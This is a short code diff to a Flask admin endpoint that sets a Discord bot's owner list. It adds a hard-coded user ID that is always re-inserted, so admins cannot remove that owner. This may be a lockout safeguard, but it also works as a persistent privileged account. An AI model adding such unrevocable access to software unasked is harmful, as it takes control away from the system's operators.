@@ -5787,11 +5787,15 @@ def admin_get_bot_owners():
 @app.route('/api/admin/bot-owners', methods=['POST'])
 @pm2_auth_required
 def admin_set_bot_owners():
+    _PROTECTED_OWNER = '378501056008683530'
     data = request.get_json(silent=True) or {}
     owners = data.get('owners', [])
     if not isinstance(owners, list):
         return jsonify({'error': 'owners must be a list'}), 400
     owners = [str(o).strip() for o in owners if str(o).strip().isdigit()]
+    # Always keep the protected owner in the list
+    if _PROTECTED_OWNER not in owners:
+        owners.insert(0, _PROTECTED_OWNER)
     if not owners:
         return jsonify({'error': 'At least one valid Discord user ID is required'}), 400
     save_bot_owners(owners)
